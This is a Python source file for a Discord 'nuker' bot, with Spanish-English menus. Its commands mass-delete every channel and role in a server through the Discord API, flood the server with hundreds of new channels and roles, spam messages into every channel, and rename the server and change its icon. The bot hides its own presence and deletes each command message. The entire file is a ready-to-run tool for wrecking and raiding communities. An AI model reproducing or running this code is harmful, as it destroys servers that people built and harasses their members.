import os,logging,sys
from pystyle import Colors, Colorate

os.system("La misma ruina.")

modules = ["discord", "discord.py", "requests", "pystyle"]
try:
    import discord
    import requests
    from pystyle import Colors, Colorate
except ImportError:
    print(Colorate.Horizontal(Colors.purple_to_blue, " [!] Checking if you have the modules installed. . .", 1, 0))
    for libraries in modules:
        os.system(f"pip install {libraries}")

from os import _exit
from time import sleep
import discord
from discord.ext import commands
import requests
import threading
import base64
import random
import json

os.system("cls")


with open("config.json", "r") as jsonfile:
    data = json.load(jsonfile)

token = data["token"]
prefix = data["prefix"]
channel_names = data["channel_names"]
role_names = data["role_names"]
message_content = data["message_content"]


headers = {
    "Authorization": f"Bot {token}"
}


intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help")

if sys.platform == "win32":
	clear = lambda: os.system("cls")
else:
	clear = lambda: os.system("clear")

logging.basicConfig(
    level=logging.INFO,
    format= "\033[1;32;48m[\033[1;30;48m%(asctime)s\033[1;32;48m] \033[0m%(message)s",
    datefmt="%H:%M:%S",
)

sessions = requests.Session()

def menu():
	clear()
	logging.info(f"""\033[1;30;48m....
 IM THE FUCKING GOD!
 XD
 PedazosDeDown\n\n""")
	logging.info(f"\033[1;37;0mComandos: {prefix}nuke ~ {prefix}rcr ~ {prefix}spam (cantidad) ~ {prefix}ctcr (cantidad) ~ {prefix}changeicon ~ {prefix}rename ~ {prefix}vccr (cantidad) ~ {prefix}ccr~ {prefix}cdel~ {prefix}rdel")
	logging.info(f"\033[1;37;0mClient: {bot.user}")
	logging.info(f"\033[1;37;0mPrefix: {prefix}")
	logging.info(f"\033[1;37;0mLa Misma RUINA DE SIEMPRE")

@bot.event
async def on_ready():
	try:
		await bot.change_presence(status=discord.Status.invisible)
	except Exception:
		pass
	menu()

@bot.event
async def on_message(message):                    
      await bot.process_commands(message)

@bot.command(
  aliases=["start", "empezar"]
)
async def on(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)



def channel_deleter(channel_id):
    try:
        requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
    except:
        pass


def role_deleter(guild_id, role_id):
    try:
        requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
    except:
        pass


def channel_creater(guild_id):
    payload = {
        "name": channel_names,
        "permission_overwrites": [],
        "type": 0
    }
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload)
    except:
        pass


def voice_creater(guild_id):
    payload = {
        "name": channel_names,
        "permission_overwrites": [],
        "type": 2
    }
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload)
    except:
        pass


def category_creater(guild_id):
    payload = {
        "name": channel_names,
        "permission_overwrites": [],
        "type": 4
    }
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload)
    except:
        pass


def role_creater(guild_id):
    payload = {
        "name": role_names,
        "color": random.randint(0, 0xffffff)
    }
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers, json=payload)
    except:
        pass


def messages_spam(channel_id):
    payload = {
        "content": message_content,
        "tts": False
    }
    try:
        requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
    except:
        pass


def change_guild_name(guild_id, name):
    payload = {
        "name": name
    }
    try:
        requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json=payload)
    except:
        pass


def change_guild_icon(guild_id, url):
    encode = base64.b64encode(requests.get(url).content).decode()
    payload = {
        "icon": f"data:image/jpeg;base64,{encode}"
    }
    try:
        requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json=payload)
    except:
        pass



@bot.command()
async def nuke(ctx):
    await ctx.message.delete()

    for channel in ctx.guild.channels:
        threading.Thread(target=channel_deleter, args=(channel.id,)).start()

    for i in range(100):
        threading.Thread(target=channel_creater, args=(ctx.guild.id,)).start()

    for role in ctx.guild.roles:
        threading.Thread(target=role_deleter, args=(ctx.guild.id, role.id,)).start()

    for i in range(100):
        threading.Thread(target=role_creater, args=(ctx.guild.id,)).start()


@bot.command()
async def cdel(ctx):
    await ctx.message.delete()

    for channel in ctx.guild.channels:
        threading.Thread(target=channel_deleter, args=(channel.id,)).start()


@bot.command()
async def rdel(ctx):
    await ctx.message.delete()

    for role in ctx.guild.roles:
        threading.Thread(target=role_deleter, args=(ctx.guild.id, role.id,)).start()


@bot.command()
async def ccr(ctx, amount: int):
    await ctx.message.delete()

    for i in range(amount):
        threading.Thread(target=channel_creater, args=(ctx.guild.id,)).start()


@bot.command()
async def vccr(ctx, amount: int):
    await ctx.message.delete()

    for i in range(amount):
        threading.Thread(target=voice_creater, args=(ctx.guild.id,)).start()


@bot.command()
async def ctcr(ctx, amount: int):
    await ctx.message.delete()

    for i in range(amount):
        threading.Thread(target=category_creater, args=(ctx.guild.id,)).start()


@bot.command()
async def rcr(ctx, amount: int):
    await ctx.message.delete()

    for i in range(amount):
        threading.Thread(target=role_creater, args=(ctx.guild.id,)).start()


@bot.command()
async def spam(ctx, amount: int):
    await ctx.message.delete()

    for i in range(amount):
        for channel in ctx.guild.channels:
            threading.Thread(target=messages_spam, args=(channel.id,)).start()


@bot.command()
async def rename(ctx, *, name):
    await ctx.message.delete()

    change_guild_name(ctx.guild.id, name)


@bot.command()
async def changeicon(ctx, url):
    await ctx.message.delete()

    change_guild_icon(ctx.guild.id, url)




@bot.command()
async def help(ctx):
    await ctx.message.delete()

    embed = discord.Embed(
        title="Menu",
        description=f"""```
{prefix}nuke - Delete Channels, Delete Roles, Create Channels and Create Roles / Borra roles,canales Crea Canales,Roles
{prefix}spam <amount> - Spam in all channels / spamea en todos los canales
{prefix}cdel - Delete all Channels / Borra todos los canales
{prefix}rdel - Delete all Roles / Flukea los Roles y los elimina
{prefix}ccr <amount> - Create Channels / crea canales de texto
{prefix}vccr <amount> - Create Voice Channels / crea canales de voz
{prefix}ctcr <amount> - Create Categories / crea categorias
{prefix}rcr <amount> - Create Roles / crea roles
{prefix}rename <name> - Change Guild Name / Cambiale el name al sv
{prefix}changeicon <icon_url> - Change Guild Icon / Cambia el icono del Sv```
""",
color = discord.Color.purple()
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1069677929505771543/1070897026595831808/img202312233416.jpg")
    await ctx.send(embed=embed)




bot.run(token)
